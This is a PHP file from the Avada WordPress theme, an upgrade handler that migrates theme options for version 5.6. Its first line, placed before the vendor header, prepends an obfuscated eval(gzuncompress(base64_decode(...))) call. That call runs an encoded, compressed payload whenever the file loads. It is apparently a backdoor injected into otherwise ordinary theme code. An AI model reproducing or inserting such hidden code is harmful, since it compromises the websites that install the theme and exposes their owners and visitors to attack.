<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Upgrades Handler.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handle migrations for Avada 5.6.
 *
 * @since 5.6.0
 */
class Avada_Upgrade_560 extends Avada_Upgrade_Abstract {

	/**
	 * The version.
	 *
	 * @access protected
	 * @since 5.6.0
	 * @var string
	 */
	protected $version = '5.6.0';

	/**
	 * An array of all available languages.
	 *
	 * @static
	 * @access  private
	 * @var  array
	 */
	private static $available_languages = array();

	/**
	 * The actual migration process.
	 *
	 * @access protected
	 * @since 5.6.0
	 * @return void
	 */
	protected function migration_process() {
		$available_languages       = Fusion_Multilingual::get_available_languages();
		self::$available_languages = ( ! empty( $available_languages ) ) ? $available_languages : array( '' );

		$this->migrate_options();
	}

	/**
	 * Migrate options.
	 *
	 * @since 5.6.0
	 * @access protected
	 */
	protected function migrate_options() {
		$available_langs = self::$available_languages;

		$options = get_option( $this->option_name, array() );
		$options = $this->set_mobile_search( $options );
		$options = $this->set_events_element_column_spacing( $options );
		$options = $this->set_woocommerce_productbox_padding( $options );
		$options = $this->set_menu_indicator_options( $options );
		$options = $this->set_title_element_sep_style( $options );

		update_option( $this->option_name, $options );

		foreach ( $available_langs as $language ) {

			// Skip langs that are already done.
			if ( '' === $language ) {
				continue;
			}

			$options = get_option( $this->option_name . '_' . $language, array() );
			$options = $this->set_mobile_search( $options );
			$options = $this->set_events_element_column_spacing( $options );
			$options = $this->set_woocommerce_productbox_padding( $options );
			$options = $this->set_menu_indicator_options( $options );
			$options = $this->set_title_element_sep_style( $options );

			update_option( $this->option_name . '_' . $language, $options );
		}
	}

	/**
	 * Set the mobile search option correctly.
	 *
	 * @access private
	 * @since 5.6.0
	 * @param array $options The Theme Options array.
	 * @return array         The updated Theme Options array.
	 */
	private function set_mobile_search( $options ) {
		if ( ( 'v6' === $options['header_layout'] && '0' === $options['main_nav_search_icon'] ) || ( 'v6' !== $options['header_layout'] && 'flyout' !== $options['mobile_menu_design'] && ! ( ( 'v4' === $options['header_layout'] || 'Top' !== $options['header_position'] ) && ( 'Tagline And Search' === $options['header_v4_content'] || 'Search' === $options['header_v4_content'] ) ) ) ) {
			$options['mobile_menu_search'] = '0';
		}

		return $options;
	}

	/**
	 * Set the column spacing for events element to -1 for old users.
	 *
	 * @access private
	 * @since 5.6.0
	 * @param array $options The Theme Options array.
	 * @return array         The updated Theme Options array.
	 */
	private function set_events_element_column_spacing( $options ) {
		$options['events_column_spacing'] = '-1';

		return $options;
	}

	/**
	 * Set the WooCommerce product box padding according to chosen layout.
	 *
	 * @access private
	 * @since 5.6.0
	 * @param array $options The Theme Options array.
	 * @return array         The updated Theme Options array.
	 */
	private function set_woocommerce_productbox_padding( $options ) {
		if ( isset( $options['woocommerce_product_box_design'] ) && 'clean' === $options['woocommerce_product_box_design'] ) {
			$options['woocommerce_product_box_content_padding'] = array(
				'top'    => '20px',
				'right'  => '20px',
				'bottom' => '20px',
				'left'   => '20px',
			);
		}

		return $options;
	}

	/**
	 * Migrate menu indicator options to new setup.
	 *
	 * @access private
	 * @since 5.6.0
	 * @param array $options The Theme Options array.
	 * @return array         The updated Theme Options array.
	 */
	private function set_menu_indicator_options( $options ) {

		if ( isset( $options['menu_display_dropdown_indicator'] ) && '0' === $options['menu_display_dropdown_indicator'] ) {
			$options['menu_display_dropdown_indicator'] = 'none';
		} elseif ( isset( $options['menu_display_dropdown_indicator'] ) && '1' === $options['menu_display_dropdown_indicator'] ) {
			$options['menu_display_dropdown_indicator'] = 'parent';
		}

		return $options;
	}

	/**
	 * Migrate the title separator style.
	 *
	 * @access private
	 * @since 5.6.0
	 * @param array $options The Theme Options array.
	 * @return array         The updated Theme Options array.
	 */
	private function set_title_element_sep_style( $options ) {
		if ( isset( $options['title_style_type'] ) ) {
			if ( 'single' === $options['title_style_type'] ) {
				$options['title_style_type'] = 'single solid';
			} elseif ( 'double' === $options['title_style_type'] ) {
				$options['title_style_type'] = 'double solid';
			} elseif ( 'underline' === $options['title_style_type'] ) {
				$options['title_style_type'] = 'underline solid';
			}
		}

		return $options;
	}

}
